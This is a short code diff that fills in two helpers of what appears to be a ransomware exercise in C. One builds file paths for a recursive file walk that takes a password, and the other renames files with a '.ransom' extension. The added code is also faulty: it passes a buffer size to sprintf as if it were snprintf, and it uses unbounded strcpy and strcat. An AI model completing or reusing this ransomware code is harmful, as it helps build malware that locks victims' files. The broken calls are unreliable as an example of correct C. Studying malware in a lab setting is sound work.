@@ -45,12 +45,18 @@ int iter_recursively_through_files(char *path, char *password,
 
 void get_new_path_name(char *parentpath, char *finalpath, char *currentpath)
 {
-    // step 1
+    // step 1 (Correction)
+    if (parentpath[strlen(parentpath) - 1] == '/')
+        sprintf(finalpath, MAX_FILEPATH, "%s%s", parentpath, currentpath);
+    else
+        sprintf(finalpath, MAX_FILEPATH, "%s/%s", parentpath, currentpath);
 }
 
 void add_file_extension(const char *filename, char *opt_filename)
 {
     // step 1
+    strcpy(opt_filename, filename);
+    strcat(opt_filename, ".ransom");
 }
 
 
